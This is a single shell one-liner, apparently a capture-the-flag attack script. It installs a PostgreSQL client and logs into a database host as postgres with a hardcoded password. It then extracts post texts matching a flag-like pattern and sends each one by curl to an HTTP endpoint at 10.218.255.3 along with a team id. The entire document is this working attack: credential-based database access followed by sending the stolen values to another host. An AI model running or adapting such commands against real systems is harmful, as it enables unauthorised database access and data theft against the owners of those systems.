apt-get install -y postgresql-client && echo "SELECT post_text FROM Posts WHERE post_text like '%-%-%-%-%' ORDER BY public_date desc limit 100" | PGPASSWORD=sibirwtf2019 psql -t test postgres -h perl_db | xargs -I {} bash -c 'curl 'http://10.218.255.3/flag?teamid=team14&flag={}''
